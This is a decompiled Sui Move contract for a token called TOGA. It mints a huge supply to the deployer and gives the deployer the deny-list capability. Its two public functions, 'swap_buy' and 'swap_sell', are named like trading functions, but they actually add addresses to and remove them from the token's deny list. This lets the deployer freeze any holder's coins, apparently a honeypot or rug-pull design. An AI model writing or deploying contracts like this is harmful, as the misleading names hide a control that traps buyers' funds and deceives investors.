module 0x55b04bdfa13600d5554a2034e9a31cb07486ea8cc22bcdabfe3dc76a354cbb30::toga {
    struct TOGA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TOGA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TOGA>(arg0, 9, b"TOGA", b"TOGA", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmViVvZP4iqX57UN3TCFS9eE4M3KULPSMhEj26ytGUfbMV"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TOGA>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TOGA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TOGA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TOGA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TOGA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TOGA>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TOGA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<TOGA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

